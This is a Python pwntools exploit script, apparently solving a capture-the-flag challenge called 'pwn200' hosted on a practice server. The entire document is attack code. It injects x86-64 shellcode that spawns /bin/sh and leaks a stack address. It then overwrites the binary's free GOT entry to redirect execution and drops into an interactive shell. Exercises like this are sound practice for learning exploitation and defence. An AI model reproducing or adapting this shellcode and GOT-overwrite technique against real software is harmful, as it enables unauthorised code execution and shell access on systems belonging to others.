from pwn import *
from sys import argv
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './pwn200'

context.binary = binary
elf = ELF(binary)
r = remote('node4.buuoj.cn',26569) if argv[1]=='r' else process(binary)


def dbg():
    gdb.attach(r)

shellcode = asm(
'''
xor rsi,rsi
mul esi
push rax
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
''')

p1 = shellcode + (48 - len(shellcode)) * b'a'
r.sendlineafter('who are u?', p1)
#应该是这里的\n成为了输入id的值所以下面没有输入id
ebp_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
success('ebp_addr = ' + hex(ebp_addr))

shellcode_addr = ebp_addr - 0x50

free_got = elf.got['free']

p2 = p64(shellcode_addr)
r.send(p2 + b'\x00' * (0x38 - len(p2)) + p64(free_got))
# dbg()
r.sendlineafter('your choice : ', '2')

r.interactive()
